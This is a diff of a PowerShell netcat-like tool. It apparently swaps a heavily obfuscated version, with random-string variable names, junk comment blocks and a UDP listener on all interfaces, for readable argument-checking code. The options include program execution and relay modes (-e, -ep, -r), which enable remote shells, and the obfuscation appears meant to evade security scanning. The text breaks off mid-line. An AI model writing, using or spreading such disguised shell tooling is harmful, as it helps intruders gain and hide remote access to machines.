- $3s1sLoTSS8mnNNcJeZxihAtjT0zOl69FnuVzF9kUDFC3FmtCGtTLBcBW4KVSI3ygJstQ6Ap3tmxhP90KExryO5kFE2nlzPbJwBcOzwlYXItuLc96GDk8WqIJasEbWPg6CjBWoMwN5UT0BAdgqoreFTpCTNW2a9k6nrj45D6SHIQbr4YF0soTHIqVvtJ5z56JoG7Esqelc6lFcwoFUQYxR3xD0HnNbqJMwdKfceckyBx1OFaurDADUbDVkxOe2XxvrITz8vQjY12CqugiMrO5jOQZOy3L4sbLgdh4hezAAyYAvHioC2rENLs27fONllY5tFV6HDUivBwTcXqBBFtcVDt9EPZZSncBhswDMCsP4MLhjs4Q2IgFymdS1PYh9Nuu9dKbNkWSisIB5N13uaXpleUhytRsvRHcGeIdg74Y50Y0PemOyVOXWihxJ1ey4LN69r9V2rQZJjjlaP3OjS5tvPTnJi1ehdRFT1J3cmjyvxzcxX53Y8mhHBykUngHuyMHpEyn4lehDqndMQUJMVEBtGmUYiicOZu33cNcAMqOOL8Ef51CUJVGc1Zr7BFkkaBG89X7nvPC1EiGUBRKt1COAAUWdB9QSYn1g8chfwI9mnVEbNJyDGaaI5C6xwrvFOrTS13nuKhNC0ZGmMDSmNI9Ptv8BFiMY2tirN3YTOZSYQzXjaLsLs5rohrY4QugSscT9mrNcIqaJjAlQ3WnEuu1Kxtr2yIbfgQuCl7wgV6QT4xU5fth76wIu0m5HDui7Z3Y3VUBPWeZOQrtFS3KwnFzVDLCz5IxW5I19KKdk:Verbose = $MEsBa7kjiO38dxWVWltAfLSMZELrMfiSoRPVAQKMf5q2kSrciLeVTmqXcsqO8nqCwSYu6BY1LKIfLf8Ph4AtNtJMg7Ya3aYUGmUntuE6rkdHA6iRwOoY8umig27uFvTs1q5JvIZcFIuptS7IAlSX2oRKJP2tEiq5Pat9slktET1ndRiytTv35Dv2dCpGK1gcl2nmfhEFXO9LpVVgqv0AfQ1vygQyZlRhew82VlIGgqE000ASni3M5yO5A3XKcQEgAD2eZL6lFyq2sMUSkcG17LtlgDiFqrrN11FgsBuTvmJZUHB5XarixTqahsnlrH8TKE19PS3OdP0mi68qh892JvyD7Gv18Ug8QGWTS22PU39
-  if($oF -ne ''){$o = 'Bytes'}
-     if($DNS -eq "")
-        {
- if((($C -eq "") -and (!$l)) -or (($C -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
-      if($p -eq ""){return "Please provide a port number to -p."}
- }
-        if(((($R -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($EP))) -or  (($R -ne "") -and ($EP))){return "You can only pick one of these: -e, -ep, -r"}
-  if(($I -ne $NUll) -and (($R -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
-      if($l)
-      {
-    $jGTafGt3mX3w0thUfhqBpcYBm9L9xGq7OIwa6zOZtXCHXBGCTidSCFPLkkhhzCkLVvgJrLDS1LyPdgwjZ2U5xgFyA6JBSG2vaBgqaYZ5cj62wGJ6i0IDZj0XinEz4HDVeadIoPFW6hxhOWHLx3lDI7XxbOPbhQugglUniuVCkWM5lfkqEnx4H0ewc4iu1dRu9MBIGns12UXg7bDUO4mGb5FRiVgUdoo62rt3D5pWnqjv6xvThAM5QNfZQ2HAMNKXKMISVVhcn27t2YWeQqAk3vuYYMtna6EDUlQ28gqa0mE954dnOCvrUF9yn8t898Qv6aLUGVdh0Po9UgUU2scKA21ixIpwFtP1ohK11OAPcpisHApzsSZfkvv6PVylY3gPeILGNCUtoX1P5rP4XIJ86MvyzNszjc63COMYmiOyZyVpSSG4bw0dZHe037TgIXPgKPkjIDjZFiKzKPoRpurr9DOI9dzuZP3rEF8YlXXxHzjsKrj1OITFyTXKQczmkULBnli9vz3OkmBG0SX7tBJJJq94v21ReYK35EYmFkRqX7KixQOcGpF4G7Avn4k0N7pC3bBsouq2eXSBqcfvUj1xlNRBlF63qX9xL47ZkEc0GNSgyzyrpMN5SUVOQiavXBqhJHwtFv96ooDX8NY0gcKntbITRqrEbttE2yr2FWpApKrE7OMBZDjaI09yNo7kwAnYUusA71wyF8zVYToBFPZL36ST52yPJsZjOr0mYxWOwI0LQx4xDICvNVCX9U5Wq5lCInhztpTHO4t6nrAjzJldKhxlWEPuXtpDd16KC1HRD1trV0B1sFxaXTapcRyjB3rwKOfg15t032kMA66Jz4HuHsScbmSpfjiaVWZzMvNRfCjDvFl30MCZNErg30wykFd65tyv3rhBsbn9qpU0fW4nFfJl1 = $falSE
-         netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $jGTafGt3mX3w0thUfhqBpcYBm9L9xGq7OIwa6zOZtXCHXBGCTidSCFPLkkhhzCkLVvgJrLDS1LyPdgwjZ2U5xgFyA6JBSG2vaBgqaYZ5cj62wGJ6i0IDZj0XinEz4HDVeadIoPFW6hxhOWHLx3lDI7XxbOPbhQugglUniuVCkWM5lfkqEnx4H0ewc4iu1dRu9MBIGns12UXg7bDUO4mGb5FRiVgUdoo62rt3D5pWnqjv6xvThAM5QNfZQ2HAMNKXKMISVVhcn27t2YWeQqAk3vuYYMtna6EDUlQ28gqa0mE954dnOCvrUF9yn8t898Qv6aLUGVdh0Po9UgUU2scKA21ixIpwFtP1ohK11OAPcpisHApzsSZfkvv6PVylY3gPeILGNCUtoX1P5rP4XIJ86MvyzNszjc63COMYmiOyZyVpSSG4bw0dZHe037TgIXPgKPkjIDjZFiKzKPoRpurr9DOI9dzuZP3rEF8YlXXxHzjsKrj1OITFyTXKQczmkULBnli9vz3OkmBG0SX7tBJJJq94v21ReYK35EYmFkRqX7KixQOcGpF4G7Avn4k0N7pC3bBsouq2eXSBqcfvUj1xlNRBlF63qX9xL47ZkEc0GNSgyzyrpMN5SUVOQiavXBqhJHwtFv96ooDX8NY0gcKntbITRqrEbttE2yr2FWpApKrE7OMBZDjaI09yNo7kwAnYUusA71wyF8zVYToBFPZL36ST52yPJsZjOr0mYxWOwI0LQx4xDICvNVCX9U5Wq5lCInhztpTHO4t6nrAjzJldKhxlWEPuXtpDd16KC1HRD1trV0B1sFxaXTapcRyjB3rwKOfg15t032kMA66Jz4HuHsScbmSpfjiaVWZzMvNRfCjDvFl30MCZNErg30wykFd65tyv3rhBsbn9qpU0fW4nFfJl1=$tRue}}
-      if($jGTafGt3mX3w0thUfhqBpcYBm9L9xGq7OIwa6zOZtXCHXBGCTidSCFPLkkhhzCkLVvgJrLDS1LyPdgwjZ2U5xgFyA6JBSG2vaBgqaYZ5cj62wGJ6i0IDZj0XinEz4HDVeadIoPFW6hxhOWHLx3lDI7XxbOPbhQugglUniuVCkWM5lfkqEnx4H0ewc4iu1dRu9MBIGns12UXg7bDUO4mGb5FRiVgUdoo62rt3D5pWnqjv6xvThAM5QNfZQ2HAMNKXKMISVVhcn27t2YWeQqAk3vuYYMtna6EDUlQ28gqa0mE954dnOCvrUF9yn8t898Qv6aLUGVdh0Po9UgUU2scKA21ixIpwFtP1ohK11OAPcpisHApzsSZfkvv6PVylY3gPeILGNCUtoX1P5rP4XIJ86MvyzNszjc63COMYmiOyZyVpSSG4bw0dZHe037TgIXPgKPkjIDjZFiKzKPoRpurr9DOI9dzuZP3rEF8YlXXxHzjsKrj1OITFyTXKQczmkULBnli9vz3OkmBG0SX7tBJJJq94v21ReYK35EYmFkRqX7KixQOcGpF4G7Avn4k0N7pC3bBsouq2eXSBqcfvUj1xlNRBlF63qX9xL47ZkEc0GNSgyzyrpMN5SUVOQiavXBqhJHwtFv96ooDX8NY0gcKntbITRqrEbttE2yr2FWpApKrE7OMBZDjaI09yNo7kwAnYUusA71wyF8zVYToBFPZL36ST52yPJsZjOr0mYxWOwI0LQx4xDICvNVCX9U5Wq5lCInhztpTHO4t6nrAjzJldKhxlWEPuXtpDd16KC1HRD1trV0B1sFxaXTapcRyjB3rwKOfg15t032kMA66Jz4HuHsScbmSpfjiaVWZzMvNRfCjDvFl30MCZNErg30wykFd65tyv3rhBsbn9qpU0fW4nFfJl1){break}
-       }
-        if($R -ne "")
-       {
-         if($R.split(":").Count -eq 2)
-      {
-    $jGTafGt3mX3w0thUfhqBpcYBm9L9xGq7OIwa6zOZtXCHXBGCTidSCFPLkkhhzCkLVvgJrLDS1LyPdgwjZ2U5xgFyA6JBSG2vaBgqaYZ5cj62wGJ6i0IDZj0XinEz4HDVeadIoPFW6hxhOWHLx3lDI7XxbOPbhQugglUniuVCkWM5lfkqEnx4H0ewc4iu1dRu9MBIGns12UXg7bDUO4mGb5FRiVgUdoo62rt3D5pWnqjv6xvThAM5QNfZQ2HAMNKXKMISVVhcn27t2YWeQqAk3vuYYMtna6EDUlQ28gqa0mE954dnOCvrUF9yn8t898Qv6aLUGVdh0Po9UgUU2scKA21ixIpwFtP1ohK11OAPcpisHApzsSZfkvv6PVylY3gPeILGNCUtoX1P5rP4XIJ86MvyzNszjc63COMYmiOyZyVpSSG4bw0dZHe037TgIXPgKPkjIDjZFiKzKPoRpurr9DOI9dzuZP3rEF8YlXXxHzjsKrj1OITFyTXKQczmkULBnli9vz3OkmBG0SX7tBJJJq94v21ReYK35EYmFkRqX7KixQOcGpF4G7Avn4k0N7pC3bBsouq2eXSBqcfvUj1xlNRBlF63qX9xL47ZkEc0GNSgyzyrpMN5SUVOQiavXBqhJHwtFv96ooDX8NY0gcKntbITRqrEbttE2yr2FWpApKrE7OMBZDjaI09yNo7kwAnYUusA71wyF8zVYToBFPZL36ST52yPJsZjOr0mYxWOwI0LQx4xDICvNVCX9U5Wq5lCInhztpTHO4t6nrAjzJldKhxlWEPuXtpDd16KC1HRD1trV0B1sFxaXTapcRyjB3rwKOfg15t032kMA66Jz4HuHsScbmSpfjiaVWZzMvNRfCjDvFl30MCZNErg30wykFd65tyv3rhBsbn9qpU0fW4nFfJl1 = $falSE
-  netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $R.split(":")[1]){Write-Output ("The selected port " + $R.split(":")[1] + " is already in use.") ; $jGTafGt3mX3w0thUfhqBpcYBm9L9xGq7OIwa6zOZtXCHXBGCTidSCFPLkkhhzCkLVvgJrLDS1LyPdgwjZ2U5xgFyA6JBSG2vaBgqaYZ5cj62wGJ6i0IDZj0XinEz4HDVeadIoPFW6hxhOWHLx3lDI7XxbOPbhQugglUniuVCkWM5lfkqEnx4H0ewc4iu1dRu9MBIGns12UXg7bDUO4mGb5FRiVgUdoo62rt3D5pWnqjv6xvThAM5QNfZQ2HAMNKXKMISVVhcn27t2YWeQqAk3vuYYMtna6EDUlQ28gqa0mE954dnOCvrUF9yn8t898Qv6aLUGVdh0Po9UgUU2scKA21ixIpwFtP1ohK11OAPcpisHApzsSZfkvv6PVylY3gPeILGNCUtoX1P5rP4XIJ86MvyzNszjc63COMYmiOyZyVpSSG4bw0dZHe037TgIXPgKPkjIDjZFiKzKPoRpurr9DOI9dzuZP3rEF8YlXXxHzjsKrj1OITFyTXKQczmkULBnli9vz3OkmBG0SX7tBJJJq94v21ReYK35EYmFkRqX7KixQOcGpF4G7Avn4k0N7pC3bBsouq2eXSBqcfvUj1xlNRBlF63qX9xL47ZkEc0GNSgyzyrpMN5SUVOQiavXBqhJHwtFv96ooDX8NY0gcKntbITRqrEbttE2yr2FWpApKrE7OMBZDjaI09yNo7kwAnYUusA71wyF8zVYToBFPZL36ST52yPJsZjOr0mYxWOwI0LQx4xDICvNVCX9U5Wq5lCInhztpTHO4t6nrAjzJldKhxlWEPuXtpDd16KC1HRD1trV0B1sFxaXTapcRyjB3rwKOfg15t032kMA66Jz4HuHsScbmSpfjiaVWZzMvNRfCjDvFl30MCZNErg30wykFd65tyv3rhBsbn9qpU0fW4nFfJl1=$tRue}}
-         if($jGTafGt3mX3w0thUfhqBpcYBm9L9xGq7OIwa6zOZtXCHXBGCTidSCFPLkkhhzCkLVvgJrLDS1LyPdgwjZ2U5xgFyA6JBSG2vaBgqaYZ5cj62wGJ6i0IDZj0XinEz4HDVeadIoPFW6hxhOWHLx3lDI7XxbOPbhQugglUniuVCkWM5lfkqEnx4H0ewc4iu1dRu9MBIGns12UXg7bDUO4mGb5FRiVgUdoo62rt3D5pWnqjv6xvThAM5QNfZQ2HAMNKXKMISVVhcn27t2YWeQqAk3vuYYMtna6EDUlQ28gqa0mE954dnOCvrUF9yn8t898Qv6aLUGVdh0Po9UgUU2scKA21ixIpwFtP1ohK11OAPcpisHApzsSZfkvv6PVylY3gPeILGNCUtoX1P5rP4XIJ86MvyzNszjc63COMYmiOyZyVpSSG4bw0dZHe037TgIXPgKPkjIDjZFiKzKPoRpurr9DOI9dzuZP3rEF8YlXXxHzjsKrj1OITFyTXKQczmkULBnli9vz3OkmBG0SX7tBJJJq94v21ReYK35EYmFkRqX7KixQOcGpF4G7Avn4k0N7pC3bBsouq2eXSBqcfvUj1xlNRBlF63qX9xL47ZkEc0GNSgyzyrpMN5SUVOQiavXBqhJHwtFv96ooDX8NY0gcKntbITRqrEbttE2yr2FWpApKrE7OMBZDjaI09yNo7kwAnYUusA71wyF8zVYToBFPZL36ST52yPJsZjOr0mYxWOwI0LQx4xDICvNVCX9U5Wq5lCInhztpTHO4t6nrAjzJldKhxlWEPuXtpDd16KC1HRD1trV0B1sFxaXTapcRyjB3rwKOfg15t032kMA66Jz4HuHsScbmSpfjiaVWZzMvNRfCjDvFl30MCZNErg30wykFd65tyv3rhBsbn9qpU0fW4nFfJl1){break}
-         }
+  if($h){return $Help}
+  ############### HELP ###############
+  
+  ############### VALIDATE ARGS ###############
+  $global:Verbose = $Verbose
+  if($of -ne ''){$o = 'Bytes'}
+  if($dns -eq "")
+  {
+    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
+    if($p -eq ""){return "Please provide a port number to -p."}
   }
-  # lXOBoRNzGp vrxeOUMLAReiWly SkobCuSDuoObAN BldALDpF aok THQMDAAvPpVW cYk lgdxZk ybLdvOixKdoNN
-#  gAZOt knCbJjIRXC sIXqfkrH hIsYLACjFn iQAhUlzdWhvAbfh zXAZiLyelPn KGJk WvuJgTj PgCDnquMYgE
-#   UILdkltDUkk hXtsQqULrhOr VHPfJUZh YAzlX kfmIM sckmxFVlngi rkqKclnVkxF crpZXKa LhggXKcPEDKoD HORhJD
-#     ZoLev LYFh zkgVKICelet OiPoeNI SRXrt IZeScDiGqJhZOMj uObmgPmxXREcJ DSKMyxIP VAwvMc UbaPnrCCAmMVfUo
-# WeYjMWsy vzXYDslb aidUKZgqM byHW BxDxGbPiFkQVG towEtlsWgiL LlIlEAQd SSUGzYgijea lEChZHdfo
-#   BHknvrAwNvt YXOJIP WVvcZ oHSQjYdlKBPz SegBT lInNq SJZgEcTCCLIDM fhtbkjdmtFBFyx jxmNWjwXCHFPpk
-# ckBnGJLjtP gYLeRnMJvbH jKR pPkcU KvxXeSIsG QfcbuX dDkNGvU yyNwDBkLGFL ulKXlCAR TDi HLaWOAiplt
-#    lfMAdTXumDQfti tnKqOsW iBGG UdYHjQ DQBcs yJKInJKG dFfnwDeTkhY tNWsXs QKyApmbXwaVxeZv tqmJLwAYqsvvl
-#     qgQZUMiHH SHtensZsYeibBDR uZfYpQQcVBJzxH fjkPJLpXn kzkgQGtgVRKV xLehMjBAa eBs dswUTwHfcMwLa
-#  QMARcAWus pClhnfNq AXZIkY NjZcUewg CdaykElHV UepNOSxrjLot effyJaVZ ojCzUlLygpRxbm FaTBXAiPjY
-#   FzpfEuA PSjOvyrlBZUL ztq CeuBSDsZJnvnFNa COZjsSIPN DxeEeTZ eRNSlqTRVjC nyWzMxaGjMt lmesMIrmlPSGD
-#     FIdlbD GkNDKmGj WdfeAvsOl TCWkPpz IamxoUBoAwkBU VPrQEXjRASaI JbsDdNiIEYm MVCG UtcoATUdNYvizEr
-#  DMXejZQ SRvdfJojQW jGODsmFvx JTPuwYHdrwt ybiGOtTbYr BSX ZPTUoBpIy SDjDrpdx nfxkdf dEagAgxBplD
-#    YpgxifgTQNg haZzFyqjyEiMnu DkKgY LSWzSJAkdfE idwmyLP PmEIeVey bQPr Gqx
-         
-     # XvPCtzoQA TWvFQoJVlHMFx STHLj JlqrcTDPYcCvRkW gDnqndmAsHq PYgYTQXBjir XYKgnJEGShuh
-# iBBigXfzBLgwyi tJtsIpOevLVFzo poFrl yfiDbBciVy ejZMyYLN vVcmQOlW kfdCiPYrLZAiMZ KQCqpWtOIS gtJ IiJBY
-#    BKsm cnnvGiBO yMlfMnjH NZgFGcsHaGy hUapmurGtvySsuT cGIOTlSphZniOT glErUVBbNN bHJAP zoEhQendkpq
-#     KTuAXFYpcnQnPkp nHymx kfHiIdbyxAXblL GiQ tloXjumvhk hchfGWnwEq ScX UQXpSisppOfS cnCQTsEP eMyRxevTsMWCUQG
-#  myKWsuFsmXz mpF SyEVqceE tbeL kFVWkYGQYvJEONv QyM BdkOWQ TqFpNYfNeX KORjJvTcT VNAXNzxhWOTECCh
-#  DbQcP BuV yRokTAH OQJUDnDx ftAndeuTKNo tEXaRsPNxSBMrd GUvAZne VZOtKzNJTapegn KgiHLw UeRC
-#    BMaDlbMWun fQnqitJE CclwGWfqPTL hLbjxKuo aiYzQqGBC ogKADbDMvLNb cSeHdeBjxPEja eBGjrVErk HbrBBnECkPKZWmT
-#    aSKW dvBUVzWmepa YaqWL nSnymg QvmwgZCG lBXCaMJV ktXMVZiNMxh ZbKWaJQa aKvTBZ ENEYZviN iEWeexhSZADG
-#   TlZMFMEBat jzXqqo qSvhpfQqiGOQGsF KIDsWqWMREoT sPeN NZAJGnMxeh LmiNKcMXwaa jsJpDXm fvIcBThHK
-#     ayKeUshnCFIUczC uhDx wmwGGo hzrEnKARA ZHXAQAXh kEJqTaPA lNuCWRQGR yBpMLuwbphCurHA fDp KslpRcAoRSjc
-#    IszInRpfcqlytb oQahLMLvHoFHS PmqUcANCOTkjpTC KyuLbJY PisRxCccxEHHJ OCzjpbIGUKeYbGT ksspjMfmcChwCZr
-#  bJsaXutFmiC
-function vZvkDCepcxXuhCllStMOJIMnxxFrjwmluLgCjjfi
- {
-  param($LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9)
-         if($3s1sLoTSS8mnNNcJeZxihAtjT0zOl69FnuVzF9kUDFC3FmtCGtTLBcBW4KVSI3ygJstQ6Ap3tmxhP90KExryO5kFE2nlzPbJwBcOzwlYXItuLc96GDk8WqIJasEbWPg6CjBWoMwN5UT0BAdgqoreFTpCTNW2a9k6nrj45D6SHIQbr4YF0soTHIqVvtJ5z56JoG7Esqelc6lFcwoFUQYxR3xD0HnNbqJMwdKfceckyBx1OFaurDADUbDVkxOe2XxvrITz8vQjY12CqugiMrO5jOQZOy3L4sbLgdh4hezAAyYAvHioC2rENLs27fONllY5tFV6HDUivBwTcXqBBFtcVDt9EPZZSncBhswDMCsP4MLhjs4Q2IgFymdS1PYh9Nuu9dKbNkWSisIB5N13uaXpleUhytRsvRHcGeIdg74Y50Y0PemOyVOXWihxJ1ey4LN69r9V2rQZJjjlaP3OjS5tvPTnJi1ehdRFT1J3cmjyvxzcxX53Y8mhHBykUngHuyMHpEyn4lehDqndMQUJMVEBtGmUYiicOZu33cNcAMqOOL8Ef51CUJVGc1Zr7BFkkaBG89X7nvPC1EiGUBRKt1COAAUWdB9QSYn1g8chfwI9mnVEbNJyDGaaI5C6xwrvFOrTS13nuKhNC0ZGmMDSmNI9Ptv8BFiMY2tirN3YTOZSYQzXjaLsLs5rohrY4QugSscT9mrNcIqaJjAlQ3WnEuu1Kxtr2yIbfgQuCl7wgV6QT4xU5fth76wIu0m5HDui7Z3Y3VUBPWeZOQrtFS3KwnFzVDLCz5IxW5I19KKdk:Verbose){$MEsBa7kjiO38dxWVWltAfLSMZELrMfiSoRPVAQKMf5q2kSrciLeVTmqXcsqO8nqCwSYu6BY1LKIfLf8Ph4AtNtJMg7Ya3aYUGmUntuE6rkdHA6iRwOoY8umig27uFvTs1q5JvIZcFIuptS7IAlSX2oRKJP2tEiq5Pat9slktET1ndRiytTv35Dv2dCpGK1gcl2nmfhEFXO9LpVVgqv0AfQ1vygQyZlRhew82VlIGgqE000ASni3M5yO5A3XKcQEgAD2eZL6lFyq2sMUSkcG17LtlgDiFqrrN11FgsBuTvmJZUHB5XarixTqahsnlrH8TKE19PS3OdP0mi68qh892JvyD7Gv18Ug8QGWTS22PU39 = $tRue}
- $C,$l,$p,$t = $LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl = @{}
-  $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Encoding"] = New-Object System.Text.AsciiEncoding
-   if($l)
-         {
-$H17WO98ku2z9KWWKBNCzd0qfp3KatUC35DhkhFMNsSZkg5KIJeFfTOzdQUVbqbjib7bwn3TQjZ6LGTONswGoDZLJKWPyF6YZMIeWRWYjwNcApuDEJAIdYZbb0wS3lvPAVXrz5dQS0tx0TBO01OyOpBA0MJu11IFKqqGk5LW8Pg5zc890Wq4fovuWwVT1BKpCee1E8OEWe0czsn82MzhlBNXvm61IXyNlUSbRQItcoCsk8h7EWyZBoZpX63Lbovd388jD9BmB0gOACciQxaABAKfcUJFq7uFGHjLadpKVB4NxWYG5ycBF7WfHNBcc2Rnnh4IDWFcdarnbi1iuxwKsUYiZVjtBbEXk1Fzc9Ln7JG0dTAfdMU6rFZygriQknOPB2NveWmgnoattS4XrH5EJ8umZeHFQ8JhfsrOe4oXJGcKpvFC6wza0wTCKl1rxRpfgwp5xECzxao67vtja8C5azfk = New-Object System.Byte[] 65536
-  $tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg = New-Object SyStEm.NET.IPEnDPoint ([SYSTEm.nET.IpaDDrESs]::Any), $p
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"] = New-Object System.Net.Sockets.UDPClient $p
-       $UZIDTBWfNNBVcJ42PL8u3PhY3ip0wWesqIQ2ScnRzvabv57vPsrkYuVhGxjGneOYVReVYMxOGKR0iNaZYtZKvCkNaDhOKfWUw3pA3k8tDbjsJBmBuMgxuInqjjZoStYBaMX36y8SnsCbGn24PC4oaEOHXXVHO0gFV9XcaRSIKMBJ7syFsLiR3UX9A87DXjimeYAyKRgMwuAnn11kBED3L8Kv9nfc7RMPxyj5TPTCbiihN8kRmxbRv30HJyrVHT55hdOiFyDY1MqW8sANslV5PXnlVlp2CgZ6zWW2VatdgMKbGfbduMljEa9POu5ouYNpds18YLvcovoz2UTexNuOoDHzGXmrgjWJhKLiyHJkVUBgkOiZm5cbrCgXHfZLwyeBEM8Q18xic0s99MwXuKuNa28B7PqAUgdiNtgmsQMfunlyCHU81EXZTfaLyvY10xoOCUzS1Np2YWcIigBIqNrv6OMfUch3GlVz3NbOpzeS0inVr6ZKf2tlZ8YtWWXavXBw085z22IQUvYUmclFlbGl6s9Qkz3xA6QfBBKCGdIZxBZ97Cw1W8UgQw74jRVeTbQcfqgZKxsGacXgWh5ejCt = New-Object System.Net.Sockets.IPPacketInformation
- Write-Verbose ("Listening on [0x0] port " + $p + " [udp]")
-       $xJ9oetg13pqvYIeAvPpEmQZjMNlVda9pbbJ5sPw64UK717Ag6okDFwlO6Gq9Wajb98U3WXC1HZLPz2i9FyIruwYR1tGfnMzqqthLtjFDOOeQCbs5YZ92rMaPa7ZloKgsP2SIMCQTK3qzEASjZqIfnZYN45GFdT9zIKElCUlpiJqMvA3kr19ZpI1thiVNUBVLK7HscueqwXgSE5yQhFH4w8ettx4m2M0KNI31XZs5nLvCCUVvwakG1SSrBoEn5ongeEsRsPt6CA7JPkX3oolhWWlinroZlCPyhtnNbTLgLuEvtPU25OzZ9G9NjgzXKRK0cYRrt7VmVXMCUG2Y9nzMrS1tF25wesH2amUvDnBVLl5UkT6Ojvi5cfxgph4f73gbYHTVPL3PRaJh8ZISFkoVGhK4QV5CTIhLcR1EU5MdjPcyg9DRH6XU8sFwumU1oFRpnUaWhdpL3SP3NYoIgo5MxF1WHTfZ4Zrj36zRrQ4ZmEuylNajGDVvA3PfSaKO28ubSImNrfS9MPIrHyH0KbJb315aoLq2MffFt1GHOx9wmuLrZW0mpUlhupLDijHUUp3zYXmKwBZDCaeLKGxt2vBfPeolx3oCUPvLHJRerw8jC8iaAl6XicKIIUhebNBKXs3R1GAIP7M4Wft3WsZ7UF8zP4omnSzFLApNoAZerbpvFEYRvW5pr8j1s8BCAb9NDsk2h4t2H098PKept7eWZ9JfcixTBg61W9MKUVdp4Lp6swdl7ND2fKwMdu8uZ6lKM0CtxwhRbArUzuftcM1vrQ4nZEKbG5A189QquA0MTfZdT0jQlnRqbIKsQq4P0EHZDHo6y3n6p6mhx8tU9Xy1r4HnkqPTvQ0y3T44jlCKEEnRmHTN8irDbAfHMjH2Di2UGw79XH = 